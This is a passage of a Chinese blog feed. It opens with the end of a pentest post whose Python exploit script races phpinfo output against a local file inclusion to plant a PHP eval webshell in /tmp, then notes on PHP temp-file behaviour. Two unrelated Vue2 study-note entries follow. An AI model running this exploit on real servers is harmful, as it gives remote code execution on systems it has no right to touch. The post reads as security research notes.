class="title">get_offfset</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        获取tmp名字的offset</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((self.host, self.port))</span><br><span class="line"></span><br><span class="line">        s.send(self.req_payload)</span><br><span class="line">        page = <span class="string">b&quot;&quot;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            i = s.recv(<span class="number">4096</span>)</span><br><span class="line">            page+=i        </span><br><span class="line">            <span class="keyword">if</span> i == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> i.decode(<span class="string">&#x27;utf8&#x27;</span>).endswith(<span class="string">&quot;0\r\n\r\n&quot;</span>):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        s.close()</span><br><span class="line"></span><br><span class="line">        pos = page.decode(<span class="string">&#x27;utf8&#x27;</span>).find(<span class="string">&quot;[tmp_name] =&amp;gt; &quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;get the offset :&#123;&#125; &#x27;</span>.<span class="built_in">format</span>(pos))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> pos == <span class="number">-1</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;No php tmp_name in phpinfo output&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> pos+<span class="number">256</span> <span class="comment">#多加一些字节</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">phpinfo_lfi</span>(<span class="params">self</span>):</span> </span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        同时发送phpinfo请求与lfi请求</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        phpinfo = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        lfi = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    </span><br><span class="line"></span><br><span class="line">        phpinfo.connect((self.host, self.port))</span><br><span class="line">        lfi.connect((self.host, self.port))</span><br><span class="line"></span><br><span class="line">        phpinfo.send(self.req_payload)</span><br><span class="line"></span><br><span class="line">        infopage = <span class="string">b&quot;&quot;</span> </span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">len</span>(infopage) &lt; self.offset:</span><br><span class="line">            infopage += phpinfo.recv(self.offset)</span><br><span class="line"></span><br><span class="line">        pos = infopage.decode(<span class="string">&#x27;utf8&#x27;</span>).index(<span class="string">&quot;[tmp_name] =&amp;gt; &quot;</span>)</span><br><span class="line">        tmpname = infopage[pos+<span class="number">17</span>:pos+<span class="number">31</span>]</span><br><span class="line"></span><br><span class="line">        lfireq = self.lfireq % (tmpname.decode(<span class="string">&#x27;utf8&#x27;</span>),self.host)</span><br><span class="line">        lfi.send(lfireq.encode(<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        fipage = lfi.recv(<span class="number">4096</span>)</span><br><span class="line"></span><br><span class="line">        phpinfo.close()</span><br><span class="line">        lfi.close()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> fipage.decode(<span class="string">&#x27;utf8&#x27;</span>).find(tag) != <span class="number">-1</span>:</span><br><span class="line">            <span class="keyword">return</span> tmpname</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">4</span>:</span><br><span class="line">        print(<span class="string">&#x27;usage:\n\texp.py 127.0.0.1 80 500&#x27;</span>)</span><br><span class="line">        exit()</span><br><span class="line">    host = sys.argv[<span class="number">1</span>]</span><br><span class="line">    port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    attempts = sys.argv[<span class="number">3</span>]</span><br><span class="line">    print(<span class="string">&#x27;&#123;x&#125;Start expolit &#123;host&#125;:&#123;port&#125; &#123;attempts&#125; times&#123;x&#125;&#x27;</span>.<span class="built_in">format</span>(x=<span class="string">&#x27;*&#x27;</span>*<span class="number">15</span>, host=host, port=port, attempts=attempts))</span><br><span class="line"></span><br><span class="line">    p = PHPINFO_LFI(host,port)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(attempts)):</span><br><span class="line">        print(<span class="string">&#x27;Trying &#123;&#125;/&#123;&#125; times…&#x27;</span>.<span class="built_in">format</span>(i, attempts), end=<span class="string">&quot;\r&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> p.phpinfo_lfi() <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            print(<span class="string">&#x27;Getshell success! at /tmp/eval &quot;&lt;?=eval($_REQUEST[1])?&gt;&quot;&#x27;</span>)</span><br><span class="line">            exit()</span><br><span class="line">    print(<span class="string">&#x27;:( Failed&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>但在实际使用过程中，tmp文件删除太快，导致基本没有成功包含过。</strong>由此引发的后续研究。</p><h1 id="0x02-php临时文件"><a href="#0x02-php临时文件" class="headerlink" title="0x02 php临时文件"></a>0x02 php临时文件</h1><p><strong>配置文件</strong>：<code>php.ini</code>的<code>upload_tmp_dir</code>属性指定</p><p><strong>命名规则</strong>：默认为 php+4或者6位随机数字和大小写字母，php[0-9A-Za-z]{3,4,5,6}，phpXXXXXX.tmp 在windows下有tmp后缀，linux没有。</p><p>让临时文件保存下来：</p><p>php7在满足以下版本的情况下，可以通过<code>php://filter/string.strip_tags</code>生成<code>tmp</code>文件</p><p>• php7.0.0-7.1.2可以利用， 7.1.2x版本的已被修复</p><p>• php7.1.3-7.2.1可以利用， 7.2.1x版本的已被修复</p><p>• php7.2.2-7.2.8可以利用， 7.2.9一直到7.3到现在的版本已被修复</p><h1 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h1><ol><li><p><a href="https://www.anquanke.com/post/id/183046">PHP临时文件机制与利用的思考</a></p></li><li><p><a href="https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md">PHP文件包含漏洞（利用phpinfo）</a></p></li><li><p><a href="https://github.com/M4LV0/LFI-phpinfo-RCE/blob/master/exploit.py">https://github.com/M4LV0/LFI-phpinfo-RCE/blob/master/exploit.py</a></p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本来打算研究下phpinfo+本地包含导致命令执行的利用方法，深入研究原理后发现是php临时文件机制的问题，故记录下学习过程。&lt;/p&gt;
&lt;h1 id=&quot;0x01-phpinfo-LFI&quot;&gt;&lt;a href=&quot;#0x01-phpinfo-LFI&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="Pentest" scheme="http://blog.le31ei.top/categories/Pentest/"/>
    
    
    <category term="php" scheme="http://blog.le31ei.top/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>vue2学习笔记3</title>
    <link href="http://blog.le31ei.top/2021/01/28/vue2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B03/"/>
    <id>http://blog.le31ei.top/2021/01/28/vue2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B03/</id>
    <published>2021-01-28T08:08:06.000Z</published>
    <updated>2021-01-28T08:08:06.668Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-vue-router"><a href="#1-vue-router" class="headerlink" title="1. vue-router"></a>1. vue-router</h1><ol><li>创建路由组件</li><li>配置路由映射: 组件和路径映射关系</li><li>使用路由: 通过<code>&lt;router-link&gt;</code>和<code>&lt;router-view&gt;</code></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> VueRouter <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span></span><br><span class="line"><span class="keyword">import</span> Home <span class="keyword">from</span> <span class="string">&quot;@/components/Home&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> About <span class="keyword">from</span> <span class="string">&quot;@/components/About&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Vue.use(VueRouter)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> routes = [</span><br><span class="line">  &#123;</span><br><span class="line">    path: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    redirect: <span class="string">&#x27;/home&#x27;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    path: <span class="string">&#x27;/home&#x27;</span>,</span><br><span class="line">    component: Home</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    path: <span class="string">&#x27;/about&#x27;</span>,</span><br><span class="line">    component: About</span><br><span class="line">  &#125;,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> VueRouter(&#123;</span><br><span class="line">  routes,</span><br><span class="line">  mode: <span class="string">&#x27;history&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br></pre></td></tr></table></figure><p><strong>路由模式更换</strong></p><p>默认格式：<code>http://localhost:8080/#/home</code></p><p>history模式: <code>http://localhost:8080/home</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> VueRouter(&#123;</span><br><span class="line">  routes,</span><br><span class="line">  mode: <span class="string">&#x27;history&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><strong>router-link属性</strong></p><ol><li>tag属性：可以指定<code>&lt;router-link&gt;</code>渲染成什么组件，比如<code>&lt;li&gt;</code></li><li>to属性：跳转到某个url</li><li>replace属性：替换模式，不能使用浏览器前进后退按钮</li><li>Active-class属性：选中的router-link有<code>router-link-active</code>的class属性，将<code>router-link-active</code>更名</li></ol><p><strong>代码跳转路由</strong></p><p><code>this.$router.push(&#39;/home&#39;)</code></p><p><code>this.$router.replace(&#39;/home&#39;)</code></p><p><strong>动态路由</strong></p><p>获取路由参数：<code>this.$route.params.id</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> routes = [</span><br><span class="line">  &#123;</span><br><span class="line">    path: <span class="string">&#x27;/user/:id&#x27;</span>,</span><br><span class="line">    component: User</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p><strong>懒加载</strong></p><p>当用户访问到路由的时候才加载响应的组件，更加高效</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  path: <span class="string">&#x27;/home&#x27;</span>,</span><br><span class="line">  component: <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&#x27;../components/Home&#x27;</span>)</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p><strong>路由嵌套</strong></p><ol><li>创建对应子组件，并在路由上配置对应的子路由</li><li>在组件内部使用<code>&lt;router-view&gt;</code>标签</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  path: <span class="string">&#x27;/home&#x27;</span>,</span><br><span class="line">  component: <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&#x27;../components/Home&#x27;</span>),</span><br><span class="line">  children: [</span><br><span class="line">    &#123;</span><br><span class="line">      path: <span class="string">&#x27;news&#x27;</span>,</span><br><span class="line">      component: HomeNews</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      path: <span class="string">&#x27;message&#x27;</span>,</span><br><span class="line">      component: HomeMessage</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;,</span><br><span class="line">  <span class="comment">// 在父组件中要加上&lt;router-view&gt;</span></span><br><span class="line">   &lt;router-link to=<span class="string">&quot;/home/news&quot;</span>&gt;新闻&lt;/router-link&gt;</span><br><span class="line">&lt;router-link to=<span class="string">&quot;/home/message&quot;</span>&gt;消息&lt;/router-link&gt;</span><br><span class="line">&lt;router-view&gt;&lt;/router-view&gt;</span><br></pre></td></tr></table></figure><p><strong>参数传递</strong></p><p>query方式:profile?id=1：</p><p><code>&lt;router-link :to=&quot;&#123;path: &#39;/profile&#39;, query: &#123;id: &#39;1&#39;&#125;&#125;&quot;&gt;Profile&lt;/router-link&gt;</code></p><p>js方式：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">this</span>.$router.push(&#123;</span><br><span class="line">  path: <span class="string">&#x27;profile&#x27;</span>,</span><br><span class="line">  query: &#123;</span><br><span class="line">    name: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>取值方式：<code>this.$router.query.id</code></p><p>路径方式：</p><p><code>&lt;router-link :to=&quot;/user/+userid&quot;&gt;用户&lt;/router-link&gt;</code></p><p>js方式：</p><p><code>this.$router.push(&#39;/profile&#39;+ this.userid)</code></p><p><strong>导航守卫</strong></p><p>title更换为对应页面的title</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// routes</span></span><br><span class="line">      &#123;</span><br><span class="line">        path: <span class="string">&#x27;message&#x27;</span>,</span><br><span class="line">        component: HomeMessage,</span><br><span class="line">        meta:&#123;</span><br><span class="line">          title: <span class="string">&#x27;message&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">router.beforeEach(<span class="function">(<span class="params">to, <span class="keyword">from</span>, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">document</span>.title = to.meta.title</span><br><span class="line">  next()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h1 id="2-promise"><a href="#2-promise" class="headerlink" title="2. promise"></a>2. promise</h1><p>异步编程解决方案</p><p>promise本身是一个类，传入的箭头函数参数resolve和reject也是两个函数，成功的时候调用resolve，失败的时候调用reject，</p><p>成功的处理代码写在then中，失败的代码写在catch中</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;请求&#x27;</span>)</span><br><span class="line">        <span class="comment">//resolve()    //调用resolve直接跳到.then()</span></span><br><span class="line">        reject()     <span class="comment">//调用reject，直接调到catch()</span></span><br><span class="line">    &#125;, <span class="number">1000</span>)</span><br><span class="line">&#125;).then(<span class="function">() =&gt;</span> &#123;    <span class="comment">// then可以直接传入两个函数，而省略掉catch</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;success&#x27;</span>)</span><br><span class="line"></span><br><span class="line">&#125;).catch(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;failed&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><strong>三种状态</strong></p><p>pending：等待状态，比如正在进行网络请求，或者定时器没有到指定时间</p><p>Fulfill: 满足状态，比如主动调用了resolve，就处于该状态，并且回调.then()</p><p>reject: 拒绝状态，当我们主动回调了reject时，就处于该状态，并且回调.catch()</p><p><strong>链式调用</strong></p><p>promise可以直接省略</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span> &#123;</span><br><span class="line">        resolve(<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">    &#125;, <span class="number">1000</span>)</span><br><span class="line">&#125;).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(res)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Promise</span>.resolve(res+ <span class="string">&#x27;222&#x27;</span>)</span><br><span class="line">&#125;).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(res)</span><br><span class="line">    <span class="keyword">return</span> res+<span class="string">&#x27;3333&#x27;</span>  <span class="comment">// 省略promise的resolve，直接调用then对结果进行处理</span></span><br><span class="line">&#125;).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(res)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><strong>等待同步请求: promise.all</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Promise</span>.all([</span><br><span class="line">    <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            resolve(<span class="string">&#x27;请求1&#x27;</span>)</span><br><span class="line">        &#125;, <span class="number">1000</span>)</span><br><span class="line">    &#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="comment">//resolve(&#x27;请求2&#x27;)</span></span><br><span class="line">            reject(<span class="string">&#x27;请求2失败&#x27;</span>)</span><br><span class="line">        &#125;, <span class="number">2000</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">]).then(<span class="function"><span class="params">results</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(results[<span class="number">0</span>])</span><br><span class="line">    <span class="built_in">console</span>.log(results[<span class="number">1</span>])</span><br><span class="line">&#125;).catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(err)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h1 id="3-vuex"><a href="#3-vuex" class="headerlink" title="3. vuex"></a>3. vuex</h1><p>状态管理模式</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> Vuex <span class="keyword">from</span> <span class="string">&#x27;vuex&#x27;</span></span><br><span class="line"></span><br><span class="line">Vue.use(Vuex)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> store = <span class="keyword">new</span> Vuex.Store(&#123;</span><br><span class="line">  state: &#123;  <span class="comment">// 定义要存放的数据</span></span><br><span class="line">    counter: <span class="number">1000</span></span><br><span class="line">  &#125;,</span><br><span class="line">  mutations: &#123;  <span class="comment">// 定义要怎么修改state的方法</span></span><br><span class="line">    <span class="function"><span class="title">increament</span>(<span class="params">state</span>)</span>&#123;</span><br><span class="line">      state.counter ++</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="function"><span class="title">decreament</span>(<span class="params">state</span>)</span>&#123;</span><br><span class="line">      state.counter --</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  actions: &#123;</span><br><span class="line"></span><br><span class="line">  &#125;,</span><br><span class="line">  getters: &#123;</span><br><span class="line"></span><br><span class="line">  &#125;,</span><br><span class="line">  modules: &#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> store</span><br></pre></td></tr></table></figure><p>调用的时候需要通过commit进行调用</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">this</span>.$store.commit(<span class="string">&#x27;increament&#x27;</span>, )</span><br><span class="line"><span class="comment">// commit传值</span></span><br><span class="line"><span class="built_in">this</span>.$store.commit(<span class="string">&#x27;increament&#x27;</span>, <span class="number">5</span>)</span><br></pre></td></tr></table></figure><p><strong>state</strong></p><p>单一状态树，全部状体放在一个store里面</p><p><strong>getters</strong></p><p>对state的数据进行变形后输出，类似于计算属性</p><p>调用方法：</p><p><code>$store.getters.doubleCounter</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">getters: &#123;</span><br><span class="line">  <span class="function"><span class="title">doubleCounter</span>(<span class="params">state, getters</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> state.counter * state.counter</span><br><span class="line">  &#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p><strong>响应式操作state</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Vue.set(state.info, <span class="string">&#x27;age&#x27;</span>, <span class="number">40</span>)</span><br><span class="line">Vue.delete(state.info, <span class="string">&#x27;age&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>mutations</strong></p><p>只能存放同步操作，不能使用异步操作，存在异步操作使用actions</p><p><strong>actions</strong></p><p>存放异步操作，但是只能调用mutations里面的同步函数，对state进行操作</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">actions: &#123;</span><br><span class="line">  <span class="function"><span class="title">aUpdateInfo</span>(<span class="params">context</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      context.commit(<span class="string">&#x27;updateInfo&#x27;</span>)</span><br><span class="line">    &#125;, <span class="number">1000</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>调用方法：<code>this.$store.dispatch(&#39;aUpdateInfo&#39;)</code></p><p><strong>modules</strong></p><p>对state中的数据进行分模块</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">modules: &#123;</span><br><span class="line">  a: &#123;</span><br><span class="line">    actions: &#123;&#125;,</span><br><span class="line">    mutations: &#123;&#125;,</span><br><span class="line">    getters: &#123;&#125;,</span><br><span class="line">    state: &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-vue-router&quot;&gt;&lt;a href=&quot;#1-vue-router&quot; class=&quot;headerlink&quot; title=&quot;1. vue-router&quot;&gt;&lt;/a&gt;1. vue-router&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;创建路由组件&lt;/li&gt;
&lt;li&gt;配置路由映射</summary>
      
    
    
    
    <category term="Program" scheme="http://blog.le31ei.top/categories/Program/"/>
    
    
    <category term="vue" scheme="http://blog.le31ei.top/tags/vue/"/>
    
  </entry>
  
  <entry>
    <title>vue2学习笔记2</title>
    <link href="http://blog.le31ei.top/2021/01/26/vue2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02/"/>
    <id>http://blog.le31ei.top/2021/01/26/vue2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02/</id>
    <published>2021-01-26T07:01:51.000Z</published>
    <updated>2021-01-26T07:01:51.623Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-filter-map-reduce"><a href="#1-filter-map-reduce" class="headerlink" title="1. filter/map/reduce"></a>1. filter/map/reduce</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> nums = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">20</span>, <span class="number">200</span>, <span class="number">40</span>, <span class="number">300</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">// filter：过滤函数</span></span><br><span class="line"><span class="comment">// filter回调函数必须返回一个boolean类型的值</span></span><br><span class="line"><span class="comment">// 返回true： 将回调的n参数加入到新的数组中</span></span><br><span class="line"><span class="keyword">let</span> result = nums.filter(<span class="function"><span class="keyword">function</span>(<span class="params">n</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (n % <span class="number">2</span> === <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//map: 根据规则生成新的数组</span></span><br><span class="line"><span class="keyword">let</span> result = nums.map(<span class="function"><span class="keyword">function</span>(<span class="params">n</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> n*<span class="number">2</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//reduce: 对数组中所有内容进行汇总, preValue为上一次函数的返回值，初始值为reduce的第二个参数，可省略默认为0</span></span><br><span 